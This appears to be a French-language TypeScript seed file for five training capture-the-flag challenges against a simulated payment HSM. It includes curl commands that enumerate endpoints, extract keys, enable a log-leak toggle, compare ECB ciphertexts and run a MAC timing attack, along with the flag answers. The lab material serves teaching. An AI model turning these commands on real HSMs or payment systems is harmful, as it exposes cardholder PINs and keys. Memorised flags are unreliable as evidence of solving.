import type { CtfChallengeSeed } from '../ctfChallenges';

export const HSM_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'HSM-001',
        title: 'Le Coffre Ouvert',
        description: 'Un endpoint admin du HSM expose les cles cryptographiques sans aucune authentification. Decouvrez-le, extrayez les cles et mesurez l impact.',
        freeModeDescription: 'Explorez les endpoints admin du HSM simulator. L un d entre eux revele des secrets critiques sans controle d acces.',
        category: 'HSM_ATTACK',
        difficulty: 'BEGINNER',
        points: 100,
        flagValue: 'PMP{HSM_KEYS_NO_AUTH}',
        targetService: 'hsm-simulator',
        targetEndpoint: 'GET http://hsm-simulator:8011/hsm/keys',
        vulnerabilityType: 'Broken access control',
        attackVector: 'Endpoint enumeration',
        learningObjectives: ['Enumerer les endpoints d un service', 'Identifier un endpoint non protege', 'Evaluer l impact d une fuite de cles cryptographiques'],
        estimatedMinutes: 15,
        isActive: true,
        relatedWorkshopPath: '/student/theory/hsm-keys',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Decouverte du service', stepDescription: 'Le HSM simulator expose une API REST. Verifiez qu il repond en envoyant une requete basique sur /hsm/status.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s http://hsm-simulator:8011/hsm/status', expectedOutput: 'Reponse JSON avec le statut du HSM', hintText: 'Tout service REST a generalement un endpoint /status ou /health.' },
            { stepNumber: 2, stepTitle: 'Enumeration des routes', stepDescription: 'Testez les endpoints courants d un HSM : keys, config, encrypt, decrypt, verify-mac, generate-key.', stepType: 'CURL_COMMAND', commandTemplate: 'for path in keys config status encrypt decrypt verify-mac generate-key; do echo "--- /hsm/$path ---"; curl -s -o /dev/null -w "%{http_code}" http://hsm-simulator:8011/hsm/$path; echo; done', expectedOutput: '200 sur /hsm/keys sans authentification' },
            { stepNumber: 3, stepTitle: 'Extraction des cles et du flag', stepDescription: 'L endpoint /hsm/keys repond 200 et retourne vos cles ET votre flag unique dans la reponse JSON. Incluez votre identifiant etudiant dans la requete pour recevoir votre flag personnel.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -H "x-student-id: $STUDENT_ID" http://hsm-simulator:8011/hsm/keys | jq .', expectedOutput: 'JSON avec les cles ET un champ "flag" contenant votre PMP{...} unique' },
            { stepNumber: 4, stepTitle: 'Verification absence d auth', stepDescription: 'Confirmez qu aucun mecanisme d authentification n est en place.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -v http://hsm-simulator:8011/hsm/keys 2>&1 | grep -iE "authorization|www-authenticate|401|403"', expectedOutput: 'Aucun header d authentification — Broken Access Control confirme' },
            { stepNumber: 5, stepTitle: 'Identification des cles critiques', stepDescription: 'ZPK chiffre les PIN blocks en transit. ZAK authentifie les messages ISO 8583. DEK chiffre les donnees sensibles. Toutes ces cles sont exposees sans protection.', stepType: 'ANALYSIS', hintText: 'Une ZPK compromise = TOUS les PIN blocks en transit peuvent etre dechiffres.' },
            { stepNumber: 6, stepTitle: 'Evaluation de l impact', stepDescription: 'Avec ces cles, un attaquant peut dechiffrer les PIN, forger des messages ISO valides, et lire les donnees chiffrees. Impact = compromission totale.', stepType: 'ANALYSIS' },
            { stepNumber: 7, stepTitle: 'Capture du flag', stepDescription: 'Votre flag unique est dans le champ "flag" de la reponse JSON de /hsm/keys. Copiez la valeur PMP{...} et soumettez-la dans le portail. Votre flag est personnel — il ne fonctionnera pas pour un autre etudiant.', stepType: 'EXPLOITATION', hintText: 'Le flag est retourne directement dans la reponse HTTP. Utilisez curl -s -H "x-student-id: $STUDENT_ID" http://hsm-simulator:8011/hsm/keys | jq .flag' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Commencez par des GET simples sur les endpoints du HSM. L admin expose tout par defaut.', costPoints: 5 },
            { hintNumber: 2, hintText: 'L endpoint /hsm/keys retourne toutes les cles sans aucun header d auth requis.', costPoints: 10 },
            { hintNumber: 3, hintText: 'Ajoutez le header -H "x-student-id: VOTRE_ID" a la commande curl pour recevoir votre flag unique dans la reponse JSON sous le champ "flag".', costPoints: 25 },
        ],
    },
    {
        code: 'HSM-002',
        title: 'Cles Previsibles',
        description: 'Parmi les cles du HSM, une ZPK de test a une valeur triviale (motif repete). Une ZPK faible compromet la confidentialite de tous les PIN blocks.',
        freeModeDescription: 'Inspectez les cles exposees. L une a une valeur qui ne respecte aucun standard d entropie. Identifiez-la.',
        category: 'HSM_ATTACK',
        difficulty: 'INTERMEDIATE',
        points: 150,
        flagValue: 'PMP{ZPK_11111111111111111111111111111111}',
        prerequisiteChallengeCode: 'HSM-001',
        targetService: 'hsm-simulator',
        targetEndpoint: 'backend/hsm-simulator/src/core/KeyStorage.ts',
        vulnerabilityType: 'Weak keys',
        attackVector: 'Default seed inspection',
        learningObjectives: ['Identifier un pattern de cle faible', 'Comprendre l impact d une ZPK previsible', 'Distinguer cle de test vs production'],
        estimatedMinutes: 20,
        isActive: true,
        relatedWorkshopPath: '/student/theory/hsm-keys',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Recuperation des cles', stepDescription: 'Recupérez toutes les cles du HSM avec l exploit du challenge precedent.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s http://hsm-simulator:8011/hsm/keys | jq .', expectedOutput: 'Liste complete des cles avec labels et valeurs' },
            { stepNumber: 2, stepTitle: 'Analyse des labels', stepDescription: 'Identifiez les cles par leur label. ZPK = Zone PIN Key. Cherchez les labels contenant TEST.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s http://hsm-simulator:8011/hsm/keys | jq -r ".[] | .label + \\": \\" + .value"', expectedOutput: 'ZPK_TEST avec une valeur suspecte' },
            { stepNumber: 3, stepTitle: 'Detection du pattern faible', stepDescription: 'Examinez la valeur de ZPK_TEST. Un motif repete (1111...1) = entropie zero.', stepType: 'ANALYSIS', hintText: 'Comptez les caracteres uniques. Une vraie cle AES-256 a 64 hex aleatoires.' },
            { stepNumber: 4, stepTitle: 'Verification blackbox', stepDescription: 'Confirmez la faiblesse de ZPK_TEST via l API sans lire le code source.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s http://hsm-simulator:8011/hsm/keys | jq -r \'.keys[]? | select(.label=="ZPK_TEST") | .value\'', hintText: 'Une cle de test avec motif repetitif indique une configuration hardcodee ou non aleatoire.' },
            { stepNumber: 5, stepTitle: 'Impact : dechiffrement PIN', stepDescription: 'Avec la ZPK connue, un attaquant dechiffre tout PIN block en transit. Il peut recuperer le code PIN de chaque porteur.', stepType: 'ANALYSIS' },
            { stepNumber: 6, stepTitle: 'Capture du flag', stepDescription: 'Votre flag unique est cache dans le header HTTP de la reponse. Utilisez curl -v avec votre student-id pour le voir : il se trouve dans X-CTF-Flag-HSM002. L etudiant doit inspecter les headers, pas le body.', stepType: 'EXPLOITATION', hintText: 'Cherchez le header X-CTF-Flag-HSM002 dans curl -v -H "x-student-id: $STUDENT_ID" http://hsm-simulator:8011/hsm/keys' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Concentrez-vous sur la cle ZPK_TEST et examinez sa valeur hexadecimale.', costPoints: 5 },
            { hintNumber: 2, hintText: 'La valeur est un motif repete : 32 fois le meme chiffre "1".', costPoints: 10 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
    {
        code: 'HSM-003',
        title: 'Fuite dans les Logs',
        description: 'Le HSM possede un mode debug qui logge le materiel cryptographique en clair. Activez-le et observez la fuite de secrets.',
        freeModeDescription: 'Le HSM a un endpoint de configuration avec des toggles vulnerables. Trouvez celui qui cause une fuite de secrets dans les logs.',
        category: 'HSM_ATTACK',
        difficulty: 'INTERMEDIATE',
        points: 200,
        flagValue: 'PMP{KEY_LEAK_IN_LOGS}',
        prerequisiteChallengeCode: 'HSM-002',
        targetService: 'hsm-simulator',
        targetEndpoint: 'POST /hsm/config + operations HSM',
        vulnerabilityType: 'Sensitive logging',
        attackVector: 'Debug misconfiguration',
        learningObjectives: ['Identifier une configuration debug dangereuse', 'Detecter la fuite de secrets dans les logs', 'Comprendre les exigences PCI DSS sur le logging'],
        estimatedMinutes: 25,
        isActive: true,
        relatedWorkshopPath: '/student/theory/hsm-keys',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Decouverte de la config', stepDescription: 'Interrogez l endpoint de configuration du HSM pour voir les parametres disponibles.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s http://hsm-simulator:8011/hsm/config | jq .', expectedOutput: 'JSON avec les toggles : allowReplay, keyLeakInLogs, etc.' },
            { stepNumber: 2, stepTitle: 'Analyse des toggles', stepDescription: 'Le champ vulnerabilities contient des flags booleens. Identifiez keyLeakInLogs.', stepType: 'ANALYSIS', hintText: 'Un nom tres explicite : keyLeakInLogs.' },
            { stepNumber: 3, stepTitle: 'Activation du mode debug', stepDescription: 'Envoyez un POST pour activer la fuite.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://hsm-simulator:8011/hsm/config -H "Content-Type: application/json" -d "{\\"vulnerabilities\\":{\\"keyLeakInLogs\\":true}}"', expectedOutput: 'keyLeakInLogs: true' },
            { stepNumber: 4, stepTitle: 'Declenchement d operations', stepDescription: 'Executez des operations crypto pour generer des logs avec materiel sensible.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://hsm-simulator:8011/hsm/encrypt-data -H "Content-Type: application/json" -d "{\\"data\\":\\"4111111111111111\\",\\"keyLabel\\":\\"DEK_AES_001\\",\\"mode\\":\\"CBC\\"}"' },
            { stepNumber: 5, stepTitle: 'Observation des logs', stepDescription: 'Les logs contiennent maintenant les cles en clair. Le tag [VULN:LEAK] marque les fuites.', stepType: 'OBSERVATION', hintText: 'Cherchez le tag [VULN:LEAK] dans la sortie du serveur.' },
            { stepNumber: 6, stepTitle: 'Impact PCI DSS', stepDescription: 'PCI DSS Exigence 3 interdit de stocker les SAD. Logger des cles en clair viole PCI DSS et expose tout le CDE.', stepType: 'ANALYSIS' },
            { stepNumber: 7, stepTitle: 'Capture du flag dans les logs', stepDescription: 'Votre flag unique apparait dans les logs du container HSM sous le champ "ctf_flag" lorsque vous declenchez une operation avec keyLeakInLogs actif. Cherchez la ligne taggee [VULN:LEAK] et lisez le champ ctf_flag.', stepType: 'EXPLOITATION', hintText: 'docker logs pmp-hsm-simulator --tail 30 | grep ctf_flag — votre flag PMP{...} est dans ce champ JSON' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'POST /hsm/config avec body {"vulnerabilities":{"keyLeakInLogs":true}}.', costPoints: 5 },
            { hintNumber: 2, hintText: 'Apres activation, executez une operation puis cherchez [VULN:LEAK].', costPoints: 10 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
    {
        code: 'HSM-004',
        title: 'Le Pingouin ECB',
        description: 'Le mode ECB chiffre chaque bloc independamment. Les patterns dans les donnees claires se retrouvent dans le chiffre — le celebre "pingouin ECB".',
        freeModeDescription: 'Prouvez que le mode ECB fuit la structure des donnees en chiffrant des donnees repetitives et en comparant les blocs de sortie.',
        category: 'HSM_ATTACK',
        difficulty: 'ADVANCED',
        points: 250,
        flagValue: 'PMP{ECB_LEAKS_PATTERNS}',
        prerequisiteChallengeCode: 'HSM-003',
        targetService: 'hsm-simulator',
        targetEndpoint: 'POST /hsm/encrypt-data',
        vulnerabilityType: 'Insecure cipher mode',
        attackVector: 'Block pattern analysis',
        learningObjectives: ['Comprendre la difference ECB vs CBC/GCM', 'Prouver la fuite structurelle du mode ECB', 'Evaluer l impact sur la confidentialite'],
        estimatedMinutes: 30,
        isActive: true,
        relatedWorkshopPath: '/student/theory/hsm-keys',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Chiffrement CBC de reference', stepDescription: 'Chiffrez des donnees repetitives en mode CBC pour obtenir une reference securisee.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://hsm-simulator:8011/hsm/encrypt-data -H "Content-Type: application/json" -d "{\\"data\\":\\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\",\\"keyLabel\\":\\"DEK_AES_001\\",\\"mode\\":\\"CBC\\"}" | jq .ciphertext', expectedOutput: 'Blocs chiffres tous differents grace a l IV et au chainage' },
            { stepNumber: 2, stepTitle: 'Chiffrement ECB', stepDescription: 'Les memes donnees en mode ECB.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://hsm-simulator:8011/hsm/encrypt-data -H "Content-Type: application/json" -d "{\\"data\\":\\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\",\\"keyLabel\\":\\"DEK_AES_001\\",\\"mode\\":\\"ECB\\"}" | jq .ciphertext', expectedOutput: 'BLOCS IDENTIQUES ! Meme entree = meme sortie' },
            { stepNumber: 3, stepTitle: 'Comparaison visuelle', stepDescription: 'En ECB, les blocs identiques produisent le meme chiffre. Decoupez en blocs de 32 hex.', stepType: 'ANALYSIS', hintText: 'Les blocs de 16 octets (32 hex) se repetent en ECB.' },
            { stepNumber: 4, stepTitle: 'Test determinisme', stepDescription: 'Chiffrez deux fois les memes donnees en ECB. Le ciphertext est identique — pas d IV/nonce.', stepType: 'CURL_COMMAND', commandTemplate: 'echo "=== Run 1 ===" && curl -s -X POST http://hsm-simulator:8011/hsm/encrypt-data -H "Content-Type: application/json" -d "{\\"data\\":\\"SECRET\\",\\"keyLabel\\":\\"DEK_AES_001\\",\\"mode\\":\\"ECB\\"}" | jq .ciphertext && echo "=== Run 2 ===" && curl -s -X POST http://hsm-simulator:8011/hsm/encrypt-data -H "Content-Type: application/json" -d "{\\"data\\":\\"SECRET\\",\\"keyLabel\\":\\"DEK_AES_001\\",\\"mode\\":\\"ECB\\"}" | jq .ciphertext', expectedOutput: 'Outputs identiques — determinisme total' },
            { stepNumber: 5, stepTitle: 'Impact production', stepDescription: 'ECB permet de detecter des PAN identiques et reconstituer des patterns dans une base chiffree.', stepType: 'ANALYSIS' },
            { stepNumber: 6, stepTitle: 'Capture du flag', stepDescription: 'Votre flag unique apparait dans le champ "flag" de la reponse JSON uniquement quand vous utilisez mode=ECB avec votre student-id. Le serveur detecte l usage du mode non securise et vous recompense avec votre flag personnel.', stepType: 'EXPLOITATION', hintText: 'curl -s -H "x-student-id: $STUDENT_ID" -X POST http://hsm-simulator:8011/hsm/encrypt-data -H "Content-Type: application/json" -d \'{"data":"AAAA...","keyLabel":"DEK_AES_001","mode":"ECB"}\' | jq .flag' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Testez mode "ECB" et "CBC" avec des donnees repetitives et comparez les sorties.', costPoints: 5 },
            { hintNumber: 2, hintText: 'En ECB, blocs identiques en entree produisent des blocs identiques en sortie.', costPoints: 15 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
    {
        code: 'HSM-005',
        title: 'Course contre la Montre',
        description: 'La verification MAC utilise une comparaison sequentielle. Le temps de reponse revele combien d octets sont corrects — timing side-channel.',
        freeModeDescription: 'Mesurez les temps de reponse de /hsm/verify-mac avec differents prefixes. La duree revele les octets corrects du MAC.',
        category: 'HSM_ATTACK',
        difficulty: 'EXPERT',
        points: 350,
        flagValue: 'PMP{TIMING_ATTACK_MAC}',
        prerequisiteChallengeCode: 'HSM-004',
        targetService: 'hsm-simulator',
        targetEndpoint: 'POST /hsm/verify-mac',
        vulnerabilityType: 'Timing side-channel',
        attackVector: 'Latency correlation',
        learningObjectives: ['Comprendre les attaques timing side-channel', 'Mesurer la correlation latence/bytes corrects', 'Proposer une comparaison constant-time'],
        estimatedMinutes: 40,
        isActive: true,
        relatedWorkshopPath: '/student/theory/hsm-keys',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Requete de reference', stepDescription: 'Testez verify-mac avec un MAC completement faux et notez le temps.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -w "\\nTime: %{time_total}s\\n" -X POST http://hsm-simulator:8011/hsm/verify-mac -H "Content-Type: application/json" -d "{\\"data\\":\\"PAYLOAD\\",\\"keyLabel\\":\\"ZAK_002\\",\\"mac\\":\\"0000000000000000\\"}"', expectedOutput: 'valid: false avec un temps de reference' },
            { stepNumber: 2, stepTitle: 'Test de prefixes', stepDescription: 'Essayez differents premiers octets. Si la comparaison est sequentielle, le bon prend plus longtemps.', stepType: 'CURL_COMMAND', commandTemplate: 'for prefix in 00 01 0A 0F 11 22 33 FF; do echo -n "Prefix $prefix: "; curl -s -w "%{time_total}s" -o /dev/null -X POST http://hsm-simulator:8011/hsm/verify-mac -H "Content-Type: application/json" -d "{\\"data\\":\\"PAYLOAD\\",\\"keyLabel\\":\\"ZAK_002\\",\\"mac\\":\\"${prefix}11223344556677\\"}"; echo; done', expectedOutput: 'Un prefix prend legerement plus de temps' },
            { stepNumber: 3, stepTitle: 'Scan du premier octet', stepDescription: 'Scannez les 256 valeurs possibles du premier octet et trouvez le plus lent.', stepType: 'CURL_COMMAND', commandTemplate: 'for i in $(seq 0 15); do hex=$(printf "%02x" $i); echo -n "$hex: "; curl -s -w "%{time_total}" -o /dev/null -X POST http://hsm-simulator:8011/hsm/verify-mac -H "Content-Type: application/json" -d "{\\"data\\":\\"PAYLOAD\\",\\"keyLabel\\":\\"ZAK_002\\",\\"mac\\":\\"${hex}11223344556677\\"}"; echo; done | sort -t: -k2 -rn | head -3', hintText: 'Le byte correct prend quelques ms de plus.' },
            { stepNumber: 4, stepTitle: 'Analyse statistique', stepDescription: 'Pour eliminer le bruit, repetez chaque mesure N fois. Le byte avec la latence moyenne la plus elevee est le bon.', stepType: 'ANALYSIS' },
            { stepNumber: 5, stepTitle: 'Extension byte par byte', stepDescription: 'Avec le 1er octet connu, mesurez le 2eme, puis le 3eme... 8x256 = 2048 requetes max au lieu de 2^64 par brute-force.', stepType: 'ANALYSIS' },
            { stepNumber: 6, stepTitle: 'Remediation', stepDescription: 'Correction : utiliser crypto.timingSafeEqual() qui prend toujours le meme temps.', stepType: 'EXPLANATION' },
            { stepNumber: 7, stepTitle: 'Capture du flag dans le header', stepDescription: 'Votre flag unique est dans le header de reponse X-CTF-Flag-HSM005 de chaque appel a /hsm/verify-mac. Utilisez curl -v avec votre student-id pour le voir. Le flag est toujours present — c est la decouverte du timing qui compte, pas une condition.', stepType: 'EXPLOITATION', hintText: 'curl -sv -H "x-student-id: $STUDENT_ID" -X POST http://hsm-simulator:8011/hsm/verify-mac ... 2>&1 | grep X-CTF-Flag' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Utilisez curl -w "%{time_total}" pour mesurer les temps de chaque requete.', costPoints: 5 },
            { hintNumber: 2, hintText: 'Comparez les temps pour differents prefixes. Plus d octets corrects = plus de temps si comparaison sequentielle.', costPoints: 15 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
];


